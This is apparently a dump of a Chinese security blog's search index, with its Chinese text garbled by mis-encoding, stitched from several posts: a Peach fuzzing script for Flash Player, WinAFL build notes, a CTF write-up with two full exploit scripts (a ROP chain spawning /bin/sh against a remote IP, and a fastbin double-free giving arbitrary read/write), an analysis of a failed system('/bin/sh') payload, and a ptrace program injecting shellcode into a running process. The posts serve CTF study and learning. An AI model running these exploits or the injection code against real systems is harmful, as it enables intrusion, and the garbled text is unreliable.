ç„¶åå¼€å§‹ä¸€è½®çš„fuzz 1234fuzzFilename = &quot;fuzz.swf&quot;programName = &quot;flashplayer_22_sa_debug.exe&quot;runCmd = programName +&quot; &quot;+ fuzzFilenamesubprocess.Popen(runCmd) ç„¶åæ˜¯å¼‚å¸¸æ£€æµ‹(è´¼æ“çš„æ–¹æ³•â€¦TAT) 123456789101112131415def checkCrash(): winDbg = &quot;windbg.exe&quot; #get process list try: processList = psutil.process_iter() except Exception as e: print e for p in processList: if(p.name == winDbg): print &quot;[#]Crash Found! Writing to log now ...&quot; log(fileID) sleep(1) p.kill() else: pass æœ€åå°±æ˜¯æ”¶å°¾çš„å·¥ä½œäº† 12345def clean(): subprocess.Popen(killProgram)#kill programName for next one sleep(1) if(os.path.exists(workDir+&quot;fuzz.flv&quot;)): os.remove(workDir+&quot;fuzz.flv&quot;) 0x06: ç»“æŸè¯­æˆ‘è¿™ä¸ªä¸œè¥¿åªèƒ½å«toyå§ï¼Œæ•ˆç‡ä½ä¸‹ï¼Œç®€å•ç²—æš´ã€‚ä½†æ˜¯è¿‡ç¨‹ä¸­æ˜¯å­¦ä¹ åˆ°ä¸å°‘ä¸œè¥¿ï¼Œä¹‹åçš„æ‰“ç®—æ˜¯å¤šçœ‹ä¸€äº›è®ºæ–‡ï¼Œå¤šå­¦ä¹ ä¸€äº›æ¼æ´æŒ–æ˜çš„æ–¹æ³•ï¼Œä¹‹å‰å°è¯•äº†ç»“åˆwinaflæ¥æï¼Œä¸è¿‡é—®é¢˜å¾ˆå¤šï¼Œæœ‰å¾…è§£å†³â€¦æ…¢æ…¢æ¥å§ã€‚æ‰€æœ‰çš„ä¸œè¥¿æˆ‘éƒ½ä¸¢githubäº†ï¼Œæœ‰å•¥é”™è¯¯æ¬¢è¿å„ä½å¸ˆå‚…ç•™è¨€/emailæŒ‡å¯¼æˆ‘ ä¼ é€é—¨åœ¨è¿™é‡Œï¼šfuzz with peach 0x07: å‚è€ƒflvæ–‡ä»¶æ ¼å¼è¯¦è§£peach æ–‡æ¡£Fuzzing with Peach â€“ Part 1 Â« Flinkd!","link":"/2016/12/17/fuzzing-with-peach-Just-a-toy/"},{"title":"how to compile WinAFL","text":"0x00: å‰è¨€ä»¥å‰ç»™è‡ªå·±æŒ–äº†å¥½å¤šå‘ï¼Œç»“æœå°±æ˜¯ç°åœ¨è¦ä¸€ä¸ªä¸€ä¸ªå¡«ï¼Œæ¯”å¦‚winaflçš„æ”¹é€ ï¼Œéœ€è¦é‡æ–°ç¼–è¯‘ï¼ŒæŒ‰ç…§githubä¸Šç»™å‡ºçš„æ–¹æ¡ˆç¼–è¯‘é‡åˆ°äº†é—®é¢˜ï¼Œä¹‹åå¡«äº†è¿™ä¸ªå‘ï¼Œè¿™æ®µæ—¶é—´åˆæ¥è§¦äº†ç›¸å…³çš„ä¸œè¥¿ï¼Œå°±æŠŠè¿™äº›ä¸œè¥¿æ‹¿å‡ºæ¥è®°å½•ä¸€ä¸‹ï¼Œæ–¹ä¾¿ä»¥åè‡ªå·±æŸ¥çœ‹ã€‚ 0x01: é‡åˆ°çš„é—®é¢˜ä¹‹å‰çš„æµ‹è¯•ç¯å¢ƒï¼š windows 10 x64 vs 2015 ç¼–è¯‘çš„æ–¹æ³•ï¼š For a 32-bit build: 1234mkdir build32cd build32cmake .. -DDynamoRIO_DIR=..\\path\\to\\DynamoRIO\\cmakecmake --build . --config Release For a 64-bit build: 1234mkdir build64cd build64cmake -G&quot;Visual Studio 10 Win64&quot; .. -DDynamoRIO_DIR=..\\path\\to\\DynamoRIO\\cmakecmake --build . --config Release ä¸è¿‡è¦æ³¨æ„ï¼ŒDRçš„è·¯å¾„ä¸€å®šè¦æ˜¯ç»å¯¹è·¯å¾„ã€‚ ç„¶åé‡åˆ°äº†è¿™æ ·çš„é—®é¢˜ ä¸€å †çš„é“¾æ¥é”™è¯¯â€¦. å‡ºç°è¿™æ ·çš„é—®é¢˜æ˜¯å› ä¸ºä½ vsç‰ˆæœ¬çš„é—®é¢˜ï¼Œç”¨2010å°±å¯ä»¥äº†ã€‚ 0x02: æ­£ç¡®çš„å§¿åŠ¿é¦–å…ˆä¸Šæµ‹è¯•ç¯å¢ƒ: windows7 x64 vs2010 æŒ‰ç…§ä¹‹å‰çš„æ–¹æ³•ç¼–è¯‘ï¼Œé‡åˆ°äº†è¿™æ ·çš„ä¸€ä¸ªé—®é¢˜ã€‚ è¿™ä¸ªæ˜¯å› ä¸ºæ˜¯VSç”¨æ¥è¿›è¡ŒCOFFæ ¼å¼è½¬æ¢çš„å·¥å…·cvtres.exeè¢«ç ´åäº†ã€‚ 12cvtres.exeè¢«ç ´åçš„åŸå› æ˜¯å› ä¸ºæˆ‘åˆšè£…äº†.Net Frameworkï¼Œ.Net Framework è‡ªå¸¦äº†ä¸€ä¸ªæ›´æ–°çš„cvtres.exeï¼Œå´è®©åŸæ¥VS2010ä¸­çš„cvtres.exeåŠ¨ä¸èµ·æ¥äº†ã€‚å¹¶ä¸”åœ¨VSç¼–è¯‘æ—¶ï¼ŒVSè‡ªå¸¦çš„cvtres.exeåœ¨PATHç¯å¢ƒå˜é‡çš„å‰é¢ï¼Œæ‰€ä»¥COFFè½¬æ¢å¤±è´¥ã€‚çŸ¥é“åŸå› å°±å¾ˆå¥½è§£å†³äº†:æŠŠVS2010ä¸­çš„ä¸¤ä¸ªcvtres.exeåˆ æ‰æˆ–æ”¹åå­—ï¼Œè®©VSå¯ä»¥ä½¿ç”¨.Net Framework 4.5å®‰è£…çš„cvtres.exeï¼Œå°±OKäº†ã€‚ å†æ¬¡ç¼–è¯‘ æå®šäº†32ä½çš„ç¼–è¯‘ï¼Œä¹‹åæ˜¯64ä½çš„ 0x03 : ç»“æŸè¯­ç°åœ¨å·²ç»å¯ä»¥ç¼–è¯‘äº†ï¼Œä¹Ÿå¯ä»¥ç”¨vsè°ƒè¯•äº†ï¼Œè¿™æ ·å°±å¯ä»¥å¼€å§‹æ„‰å¿«çš„winaflæ”¹é€ å·¥ä½œäº†å§~","link":"/2016/10/29/how-to-compile-WinAFL/"},{"title":"ichunqiu-CTF-2017-2","text":"0x00äº‹åå¤ç°çš„ï¼Œä¸€äº›æŠ€å·§ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡é‡åˆ°ã€‚ Black_hole1.vulnä¸»å‡½æ•° 1234567void __fastcall __noreturn main(__int64 a1, char **a2, char **a3){ alarm(0x60u); while ( check(96LL, a2) == 2333 ) vuln(); sub_4006F6();} æ¼æ´å‡½æ•°ï¼Œæ ˆæº¢å‡ºã€‚ 123456size_t vuln(){ char ptr; // [sp+0h] [bp-10h]@1 return fread(&amp;ptr, 1uLL, 32uLL, stdin);} 2.tipsä¸æ–­retåˆ°mainå‡½æ•°ï¼Œå¾ªç¯è¯»å–è¾“å…¥ï¼Œå†™å®Œpayloadä¹‹åï¼Œretåˆ°retè¿™ä¸ªgadgetsï¼Œå»æ‰§è¡ŒROPã€‚å› ä¸ºæ˜¯åŠ¨æ€é“¾æ¥x64çš„ç¨‹åºï¼Œæ‰€ä»¥ROPæ„é€ ç›´æ¥ä½¿ç”¨é€šå‹gadgetså»æ„é€ ã€‚ç¨‹åºæ²¡æœ‰leakï¼Œå¼€å§‹æˆ‘çš„æ€è·¯æ˜¯è¯»å–å¾ˆå¤šï¼Œå»ä½¿ç”¨ret2dlresolveçš„æ€è·¯å»æï¼Œæ²¡æå¥½â€¦åæ¥çœ‹äº†ä½œè€…åˆ†äº«çš„expï¼Œæ‰å‘ç°å¯ä»¥ï¼šè¦†ç›–alarm@gotæœ€åä¸€å­—èŠ‚ï¼Œçˆ†ç ´çš„æ‰‹æ®µï¼Œæ‰¾åˆ°syscallâ€¦ç„¶åå°±æ˜¯å¸ƒç½®å¥½å¯„å­˜å™¨ï¼Œèµ·shelläº†ã€‚ 3.exploit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081from pwn import *context.log_level = 'debug'context.arch='amd64'LOCAL = Falseif LOCAL: p = process('black_hole')else: #p = remote('127.0.0.1',10001) p = remote(&quot;106.75.66.195&quot;,11003)main_addr = 0x0000000000400704token = 2333def write_stack(data): p.sendline(str(token)) sleep(1) payload = data.rjust(0x18,'A') + p64(main_addr) sleep(1) p.send(payload)gadget_1 = 0x00000000004007A6gadget_2 = 0x0000000000400790 addr_got_read = 0x0000000000601028addr_bss = 0x000000000601058addr_got_alarm = 0x0000000000601020def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0,Flag=True): if Flag: pl = p64(part1) # part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret pl += p64(0) # for junk pl += p64(0x0) # rbx be 0x0 pl += p64(0x1) # rbp be 0x1 pl += p64(jmp2) # r12 jump to pl += p64(arg3) # r13 -&gt; rdx arg3 pl += p64(arg2) # r14 -&gt; rsi arg2 pl += p64(arg1) # r15 -&gt; edi arg1 pl += p64(part2) # part2 entry will call [rbx + r12 + 0x8] return pl else: pl = p64(0) # for junk pl += p64(0x0) # rbx be 0x0 pl += p64(0x1) # rbp be 0x1 pl += p64(jmp2) # r12 jump to pl += p64(arg3) # r13 -&gt; rdx arg3 pl += p64(arg2) # r14 -&gt; rsi arg2 pl += p64(arg1) # r15 -&gt; edi arg1 pl += p64(part2) # part2 entry will call [rbx + r12 + 0x8] return plpayload = com_gadget(gadget_1,gadget_2,addr_got_read,arg1=0x0,arg2=addr_got_alarm,arg3=1)payload += com_gadget(gadget_1,gadget_2,addr_got_read,arg1=0x0,arg2=addr_bss,arg3=0x3B,Flag=False)payload += com_gadget(gadget_1,gadget_2,addr_bss+8,arg1=addr_bss,arg2=0x0,arg3=0x0,Flag=False)def main(): print payload for i in xrange(len(payload), 0, -8): print i write_stack(payload[i-8:i]) sleep(1) raw_input('0x00000000004006F5 ') p.sendline(str(token)) p.send(&quot;A&quot;*0x18 + p64(0x00000000004006CB)) sleep(1) off = 5 p.send(str(off)) # ovwer write one byte sleep(1) payload2 = &quot;/bin/sh\\x00&quot; payload2 += p64(0x0000000000400540) payload2 += (0x3B - len(payload2) - 1) * &quot;A&quot; p.sendline(payload2) p.interactive()if __name__ == '__main__': main() fast-fast-fast [æœªå®Œæˆ]1.vulnfastbinçš„åˆ©ç”¨ï¼Œç›®æ ‡å°±æ˜¯æ§åˆ¶fdæŒ‡é’ˆï¼Œç„¶ååˆ†é…åˆ°è‡ªå·±æƒ³è¦çš„åœ°å€ï¼Œæ­£å¥½å…¨å±€æŒ‡é’ˆéƒ½åœ¨.bssã€‚ç¨‹åºçš„æ¼æ´æ˜¯double freeã€‚ 123456789__int64 __fastcall delet(__int64 ptr){ __int64 result; // rax@1 free(*(_QWORD *)(ptr + 16)); result = ptr; *(_QWORD *)ptr = 0LL; // set flag 0 return result;} 2.tipsåˆ©ç”¨è¿‡ç¨‹ï¼š åˆ†é…ä¸€ä¸ªfastbinï¼Œç„¶åé‡Šæ”¾æ‰ åˆ†é…ä¸€ä¸ªsmallbinï¼Œç„¶åé‡Šæ”¾fastbin(å…¶å®è¿™é‡Œé‡Šæ”¾çš„æ˜¯smallbin) å†æ¬¡åˆ†é…åˆšæ‰é‡Šæ”¾æ‰çš„å—(fastbinçš„èœå•é‡Œ) ç¼–è¾‘é‡Šæ”¾å—ï¼Œè¿™é‡Œè¦ä¼ªé€ chunk è°ƒç”¨saysercrt()åˆ†é…fastbin åˆ†é…çš„æƒ³è¦çš„å—(å¾—åˆ°ä¸€ä¸ª.bssä¸Šçš„æŒ‡é’ˆ) ä¹‹ååˆ©ç”¨editåŠŸèƒ½ï¼Œå¯ä»¥å®Œæˆä»»æ„åœ°å€è¯»å†™ ä¸è¿‡è¦æ³¨æ„çš„æ˜¯ï¼Œç¨‹åºé™æ€é“¾æ¥çš„â€¦æ‰€ä»¥ä¸ºäº†å¾—åˆ°ä¸€ä¸ªä»»æ„åœ°å€è¯»ï¼Œé€‰æ‹©è¦†ç›–.bss:00000000006C3750 __free_hook dq ? ; DATA XREF: ptmalloc_lock_all+CD\u0018rä¸º.text:00000000004082A0 sub rsp, 0D8h ; Alternative name is '_IO_printf' åœ¨å¼€å¯NXçš„æƒ…å†µä¸‹ï¼Œ 12345678$ checksec fast-fast-fast[*] '/home/muhe/Desktop/ctf_work/ichunqiu/pwn1/fast-fast-fast' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE åªèƒ½ROPäº†ï¼Œè¦ä¹ˆROPèµ·shell(syscallé‚£ç§)ï¼Œè¦ä¹ˆmprotectæ”¹å†™å†…å­˜å±æ€§æ‰§è¡Œå†™è¿›å»çš„scã€‚ 3.exploitåœ¨å®Œæˆä»»æ„åœ°å€è¯»å†™ä¹‹åï¼ŒROPé“¾è¿˜æ²¡æ„é€ å¥½â€¦éš¾è¿‡ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123from zio import *from time import sleepLOCAL = TrueLITTLE = 0x1 #fastbinSMALL = 0x2 #smallbinif LOCAL: target = './fast-fast-fast'else: target = ('127.0.0.1',10001)io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))environ = 0x00000000006C3888def create(type,content): if(type == LITTLE): #little sercret io.read_until('choose option:') io.writeline('1') io.read_until('choose option:') io.writeline('1') io.read_until('please input your secret') io.writeline(str(content)) elif(type == SMALL): #small sercret io.read_until('choose option:') io.writeline('2') io.read_until('choose option:') io.writeline('1') io.read_until('please input your secret') io.writeline(str(content))def edit(type,new_content): if(type == LITTLE): #little sercret io.read_until('choose option:') io.writeline('1') io.read_until('choose option:') io.writeline('2') sleep(1) #io.read_until('please input your secret') io.writeline(str(new_content)) elif(type == SMALL): #small sercret io.read_until('choose option:') io.writeline('2') io.read_until('choose option:') io.writeline('2') sleep(1) #io.read_until('please input your secret') io.writeline(str(new_content))def delete(type): if(type == LITTLE): #little sercret io.read_until('choose option:') io.writeline('1') io.read_until('choose option:') io.writeline('3') elif(type == SMALL): #small sercret io.read_until('choose option:') io.writeline('2') io.read_until('choose option:') io.writeline('3')def say_sercret(): io.read_until('choose option:') io.writeline('3')def write2where(addr,data): edit(LITTLE,l64(1)+l64(0x1F0)+l64(addr)) edit(SMALL,data)def read_from_where(addr): edit(LITTLE,l64(1)+l64(0xF0F0)+l64(addr)) delete(SMALL) ret = io.read_until('choose') ret = ret[:len(ret)-6] ret = ret[len(ret)-6:] return retdef main(): io.gdb_hint([0x00000000004012CA,0x0000000000401433,0x0000000000401445]) #create fastbin and free create(LITTLE,'a') delete(LITTLE) #create SMALLBIN create(SMALL,'b') #double free here delete(LITTLE) #depart freed normal chunk create(LITTLE,'c') delete(LITTLE) #edit freed fastbin edit(SMALL,l64(0x00000000006C4AA0)) #.bss ---&gt; fastbin #get it say_sercret() #get chunk ptr --&gt; 0x6c4ab0 create(LITTLE,l64(0x00000000006C4A80)) #modify free() to printf() write2where(0x00000000006C3750,l64(0x00000000004082A0)) tmp = l64(read_from_where(environ).ljust(8,'\\x00')) print &quot;stack :&quot; + hex(tmp) #now,we get the stack's addr ,and we can read-write everywhere. io.interact()if __name__ =='__main__': main() Werewolf [è¿˜æ²¡åš]","link":"/2017/02/16/ichunqiu-CTF-2017-2/"},{"title":"install gef","text":"0x00:gdbæ˜¯linuxä¸‹çš„è°ƒè¯•åˆ©å™¨ï¼Œä½†æ— å¥ˆç•Œé¢ä¸å¤ªå‹å¥½ï¼Œæ‰€ä»¥éœ€è¦ä¸€äº›è¾…åŠ©æ’ä»¶ã€‚ 0x01:ä¹‹å‰æˆ‘ä¸€ç›´ä½¿ç”¨çš„æ˜¯pead,ä¹‹å‰äº†è§£åˆ°è¿˜æœ‰ä¸ªæ’ä»¶gef,å› ä¸ºgefæ”¯æŒå¤šæ„æ¶ï¼Œè€Œä¸”heapçš„åˆ†æåŠŸèƒ½ç®€ç›´æ˜¯CTFä¸­çš„ç¥å™¨ï¼Œæ‰€ä»¥å†³å®šè£…ä¸€æ³¢ã€‚ 0x02: é—®é¢˜åœ¨æŒ‰ç…§å®˜æ–¹æ–‡æ¡£å®‰è£…ä¹‹åï¼Œä¸€ç›´æç¤ºæœ‰äº›æ¨¡å—æ— æ³•åŠ è½½ï¼Œæ˜¯å› ä¸ºä¸€äº›ä¾èµ–åº“æ²¡å®‰è£…å¥½ 0x04:è§£å†³1234567891011121314151617# root at kali in ~ [3:35:23]$ cd unicorn # root at kali in ~/unicorn on git:master o [3:35:25]$ lsAUTHORS.TXT config.mk include libunicorn.so.1 Makefile README.md uc.dbindings COPYING LEAK_VALGRIND list.c make.sh samples uc.oChangeLog CREDITS.TXT libunicorn.a list.d pkgconfig.mk tests unicorn.pcconfig.log docs libunicorn.so list.o qemu uc.c# root at kali in ~/unicorn on git:master o [3:35:25]$ cd bindings # root at kali in ~/unicorn/bindings on git:master o [3:35:27]$ lsconst_generator.py dotnet go haskell java Makefile msvc python README ruby# root at kali in ~/unicorn/bindings on git:master o [3:35:28]$ cd python # root at kali in ~/unicorn/bindings/python on git:master o [3:35:34]$ sudo python setup.py install ç„¶åå°±é¡ºåˆ©è§£å†³äº† 0x04:å®‰è£…çš„æ—¶å€™è¿˜æ˜¯å»ºè®®python3çš„ç‰ˆæœ¬ï¼Œå¦‚æœgdbä¸æ”¯æŒçš„è¯ï¼Œé‚£å°±åªèƒ½é‡æ–°ç¼–è¯‘äº†ï¼Œå¤šå¤šå…³æ³¨gefé¡¹ç›®çš„è®¨è®ºåŒº","link":"/2016/06/29/install-gef/"},{"title":"linux ä¸‹èµ·shellå¤±è´¥çš„åˆ†æ","text":"0x00: èµ·å› ä¹‹å‰åœ¨CTFä¸­é‡åˆ°è¿‡ä¸€ç§æƒ…å†µï¼Œæ‰§è¡Œäº†system(&quot;/bin/sh&quot;)ï¼Œæ–°è¿›ç¨‹ä¹Ÿèµ·æ¥äº†ï¼Œç„¶è€Œshellå¹¶æ²¡æœ‰èµ·æ¥çš„æƒ…å†µï¼Œå¾ˆå°´å°¬ï¼Œäºæ˜¯å†³å®šå¥½å¥½åˆ†æä¸€ä¸‹ä¸ºä»€ä¹ˆï¼æ‹–å»¶ç—‡çš„æˆ‘æ‹–äº†å¥½ä¹…â€¦ 0x01: å…ˆçœ‹æºç æˆ‘è§‰å¾—æœ€ç›´è§‚çš„åº”è¯¥æ˜¯çœ‹linuxå…³äºsystem()è°ƒç”¨å®ç°çš„æºç ï¼Œç„¶åå†™ä¸€ä¸ªdemoï¼Œç›´æ¥èµ·shellçš„é‚£ç§ï¼Œå•æ­¥è°ƒè¯•ï¼Œå¯¹æ¯”åˆ†æï¼Œè¿™æ ·åº”è¯¥æœ€ç›´è§‚äº†ã€‚ é¦–å…ˆæ˜¯æºç  é¦–å…ˆè°ƒç”¨system()å‡½æ•°ï¼Œå…¶å®æ˜¯è°ƒç”¨äº†do_system()å‡½æ•° 1234int system (const char *line){ return __libc_system (line);} 1234567891011121314151617181920int __libc_system (const char *line){ if (line == NULL) /* Check that we have a command processor available. It might ?not be available after a chroot(), for example. */ return do_system (\"exit 0\") == 0; /* å½“lineä¸ºNULLæ—¶ï¼Œè¿”å›å€¼ä¸º0ï¼ŒåŠæ‰§è¡Œbash â€“c exit 0*/ if (SINGLE_THREAD_P) return do_system (line); /*GCC cleanup exception range can cover the LIBC_CANCEL_ASYNC() and LIBC_CANCEL_RESET():http://sourceware.org/ml/libc-alpha/2011-08/msg00063.html */ int oldtype = LIBC_CANCEL_ASYNC (); int result = do_system (line); LIBC_CANCEL_RESET (oldtype); return result;}weak_alias (__libc_system, system) /* Execute LINE as a shell command, returning its status. */ è¿™é‡Œæ˜¯do_system()å‡½æ•°çš„åˆ†æ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114do_system (const char *line){ int status, save; pid_t pid; struct sigaction sa;#ifndef _LIBC_REENTRANT struct sigaction intr, quit;#endif sigset_t omask; sa.sa_handler = SIG_IGN; sa.sa_flags = 0; __sigemptyset (&amp;sa.sa_mask); DO_LOCK (); /* mutex lock*/ if (ADD_REF () == 0) { if (__sigaction (SIGINT, &amp;sa, &amp;intr) &lt; 0) /*æ‰§è¡Œæ—¶ SIGINTè¢«å¿½ç•¥*/ { SUB_REF (); goto out; } if (__sigaction (SIGQUIT, &amp;sa, &amp;quit) &lt; 0) /*æ‰§è¡Œæ—¶ SIGQUITè¢«å¿½ç•¥*/ { save = errno; SUB_REF (); goto out_restore_sigint; } } DO_UNLOCK (); /* We reuse the bitmap in the 'sa' structure. */ __sigaddset (&amp;sa.sa_mask, SIGCHLD); save = errno; if (__sigprocmask (SIG_BLOCK, &amp;sa.sa_mask, &amp;omask) &lt; 0) /*æ‰§è¡Œæ—¶è®¾ç½®SIG_BLOCKæ ‡å¿—ä½ï¼ŒSIGCHLDè¢«é˜»å¡ï¼Œæ‰§è¡Œå¤±è´¥ï¼Œåˆ™æ¢å¤ä¹‹å‰çš„ä¿¡å·çš„bitmap*/ {#ifndef _LIBC if (errno == ENOSYS) __set_errno (save); else#endif { DO_LOCK (); if (SUB_REF () == 0) { save = errno; (void) __sigaction (SIGQUIT, &amp;quit, (struct sigaction *) NULL);out_restore_sigint: (void) __sigaction (SIGINT, &amp;intr, (struct sigaction *) NULL); __set_errno (save); }out: DO_UNLOCK (); return -1; } }#ifdef CLEANUP_HANDLER CLEANUP_HANDLER;#endif /*æ‰§è¡ŒæˆåŠŸï¼Œè°ƒç”¨forkï¼Œç”Ÿæˆå­è¿›ç¨‹æ‰§è¡Œcommandå‘½ä»¤*/#ifdef FORK pid = FORK (); /*è°ƒç”¨SYS_CALLç”Ÿæˆå­è¿›ç¨‹*/#else pid = __fork ();#endif if (pid == (pid_t) 0) // { /* Child side. */ const char *new_argv[4]; //å‚æ•°å°±æ˜¯ï¼šbash -c ä½ çš„å‘½ä»¤ new_argv[0] = SHELL_NAME; new_argv[1] = \"-c\"; new_argv[2] = line; new_argv[3] = NULL; /* Restore the signals. */ (void) __sigaction (SIGINT, &amp;intr, (struct sigaction *) NULL); (void) __sigaction (SIGQUIT, &amp;quit, (struct sigaction *) NULL); (void) __sigprocmask (SIG_SETMASK, &amp;omask, (sigset_t *) NULL); INIT_LOCK (); /* Exec the shell. */ (void) __execve (SHELL_PATH, (char *const *) new_argv, __environ); _exit (127); /*execæ‰§è¡Œå¤±è´¥åˆ™è¿”å›127*/ } else if (pid &lt; (pid_t) 0) /* The fork failed. */ status = -1; else /*çˆ¶è¿›ç¨‹ï¼Œwaitpid*/ /* Parent side. */ { /* Note the system() is a cancellation point. But since we call waitpid() which itself is a cancellation point we do not have to do anything here. */ if (TEMP_FAILURE_RETRY (__waitpid (pid, &amp;status, 0)) != pid) status = -1; /*waitpid å¤±è´¥è¿”å›1*/ }#ifdef CLEANUP_HANDLER CLEANUP_RESET;#endif save = errno; DO_LOCK (); if ((SUB_REF () == 0 &amp;&amp; (__sigaction (SIGINT, &amp;intr, (struct sigaction *) NULL) | __sigaction (SIGQUIT, &amp;quit, (struct sigaction *) NULL)) != 0) || __sigprocmask (SIG_SETMASK, &amp;omask, (sigset_t *) NULL) != 0) {#ifndef _LIBC /* glibc cannot be used on systems without waitpid. */ if (errno == ENOSYS) __set_errno (save); else#endif status = -1; } DO_UNLOCK (); return status;} å…³äºsystemå‡½æ•°çš„è¿”å›å€¼ï¼š å½“å‚æ•°ä¸ºç©ºæ—¶ï¼Œè°ƒç”¨do_system (â€œexit 0â€),è¿”å›å€¼ä¸ºNULL è°ƒç”¨result = do_system (line) 0x02 : é—®é¢˜åˆ†æ1. å…ˆè°ƒè¯•è‡ªå·±çš„ä¸€ä¸ªdemo12345678#include &lt;stdio.h&gt;int main(int argc, char const *argv[]){4write(1,\"test\\n\",5);4system(\"/bin/sh\");4return 0;} æ‰§è¡Œåˆ°è¿™é‡Œçš„æ—¶å€™(void) __execve (SHELL_PATH, (char *const *) new_argv, __environ);gdbé‡Œå¦‚ä¸‹æ‰€ç¤º å‚æ•°æ˜¯è¿™æ ·çš„ï¼Œå•æ­¥ä¹‹åï¼Œshellå°±èµ·æ¥äº†ã€‚ 2. ä¹‹å‰æœ‰é—®é¢˜çš„expå› ç”¨çš„æ˜¯ä¹‹å‰ç™¾åº¦æ¯çš„pwnmeã€‚åœ°å€åœ¨è¿™é‡Œ retåˆ°system()çš„æ—¶å€™gdbé‡Œè°ƒè¯• siå•æ­¥åˆ†æå’Œä¹‹å‰çš„testæ‰§è¡Œexecve()çš„æ—¶å€™ï¼Œå‚æ•°å¯¹æ¯”ï¼Œå‘ç°ç¬¬ç¬¬äºŒä¸ªå‚æ•°(rsi)æœ‰é—®é¢˜ã€‚é¦–å…ˆæ˜¯è¿™ä¸ªæœ‰é—®é¢˜çš„expç„¶åæ˜¯æˆ‘è‡ªå·±çš„demo å¯ä»¥çœ‹åˆ°å› ä¸ºä¹‹å‰çš„æŸä¸ªæ“ä½œï¼ŒæŠŠ/bin/shç»™æ¸…äº†ï¼Œè¿™å°±å¯¼è‡´æ‰§è¡Œäº† sh -c null,ä¹Ÿå°±æ˜¯èµ·äº†æ–°è¿›ç¨‹ï¼Œä½†æ˜¯æ²¡shell~ 0x03 : è§£å†³è°ƒæ•´payload,æŠŠ/bin/shæ”¾åœ¨retä¹‹åï¼Œè°ƒæ•´ä¸‹offsetå°±å¥½äº†ã€‚ 1payload = \"\\x90\\x90\\x90\\x90/bin/sh\" 0x04 : å‚è€ƒ systemåˆ†æ joker â€˜s help","link":"/2016/11/10/linux-%E4%B8%8B%E8%B5%B7shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E5%88%86%E6%9E%90/"},{"title":"linux code inject","text":"0x00 : åŸºç¡€äº§ç”Ÿä¸€ä¸ªæ–°çš„è¿›ç¨‹çš„æ–¹å¼ 123sys_clone â€“ creates a copy of the running process with or without shared resources (memory, file descriptors, etc.);sys_execve â€“ replaces the running process with a new one (has several variations in the C library);fork - creates a copy of the running process but without any shared resources (Actually, both sys_fork and sys_clone come down to do_fork() function in the kernel). 0x01 : å®ä¾‹ç›®æ ‡ç¨‹åºä»£ç  1234567891011#include&lt;stdio.h&gt;#include&lt;unistd.h&gt;#include&lt;sys/types.h&gt;int main(void){ int i; for(i = 0;i&lt;10;i++){ printf(&quot;counter:%d\\n&quot;,i); sleep(2); } return 0;} æ³¨å…¥ç¨‹åºä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110#include&lt;stdio.h&gt;#include&lt;sys/ptrace.h&gt;#include&lt;stdlib.h&gt;#include&lt;sys/types.h&gt;#include&lt;sys/wait.h&gt;#include&lt;unistd.h&gt;#include&lt;string.h&gt;#include&lt;errno.h&gt;#include&lt;sys/syscall.h&gt;#include&lt;sys/user.h&gt;const int long_size = sizeof(long);void getdata(pid_t child, long addr,char* str,int len){ char * laddr; int i,j; union u{ long val; char chars[long_size]; }data; i = 0; j = len/long_size; laddr = str; while(i&lt;j){ data.val = ptrace(PTRACE_PEEKDATA,child,addr+i*4,NULL); memcpy(laddr,data.chars,long_size); ++i; laddr+=long_size; } j = len % long_size; if(j!=0){ data.val=ptrace(PTRACE_PEEKDATA,child,addr+i*4,NULL); memcpy(laddr,data.chars,j); } str[len]='\\0';}void putdata(pid_t child, long addr,char* str, int len){ int i,j; char *laddr; union u{ long val; char chars[long_size]; }data; i = 0; j = len/long_size; laddr = str; while(i&lt;j){ memcpy(data.chars,laddr,long_size); ptrace(PTRACE_POKEDATA,child,addr+i*4,data.val); ++i; laddr+=long_size; } j = len % long_size; if(j!=0){ memcpy(data.chars,laddr,j); ptrace(PTRACE_POKEDATA,child,addr+i*4,data.val); }}int main(int argc,char*argv[]){ pid_t traced_process; struct user_regs_struct regs,newregs; long ins; int k,h; int len=41; char shellcode[] = &quot;\\xeb\\x15\\x5e\\xb8\\x04\\x00\\x00\\x00&quot; &quot;\\xbb\\x02\\x00\\x00\\x00\\x89\\xf1\\xba&quot; &quot;\\x0c\\x00\\x00\\x00\\xcd\\x80\\xcc\\xe8&quot; &quot;\\xe6\\xff\\xff\\xff\\x48\\x65\\x6c\\x6c&quot; &quot;\\x6f\\x20\\x57\\x6f\\x72\\x6c\\x64\\x0a\\x00&quot;; char backup[len]; long addr; if(argc!=2){ printf(&quot;command input error\\n&quot;); exit(1); } traced_process = atoi(argv[1]); //attach to process ptrace(PTRACE_ATTACH,traced_process,NULL,NULL); wait(NULL); //get curren regs ptrace(PTRACE_GETREGS,traced_process,NULL,&amp;regs); //print eip ins = ptrace(PTRACE_PEEKTEXT,traced_process,regs.eip,NULL); printf(&quot;EIP:%lx instruction executed: %lx\\n&quot;,regs.eip,ins); getdata(traced_process,regs.eip,backup,len); //print code printf(&quot;backup is :\\n&quot;); for(k = 0;k&lt;41;k++){ printf(&quot;%x &quot;,backup[k]); } printf(&quot;\\n&quot;); putdata(traced_process,regs.eip,shellcode,len); printf(&quot;shellcode is :\\n&quot;); for(k = 0;k&lt;41;k++){ printf(&quot;%x &quot;,shellcode[k]); } printf(&quot;\\n&quot;); //re-set args ptrace(PTRACE_SETREGS,traced_process,NULL,&amp;regs); //back ptrace(PTRACE_CONT,traced_process,NULL,NULL); //wait for change wait(NULL); printf(&quot;Press the enter key to continue\\n&quot;); getchar(); //recover the code putdata(traced_process,regs.eip,backup,len); ptrace(PTRACE_SETREGS,traced_process,NULL,&amp;regs); printf(&quot;excute origion code\\n&quot;); 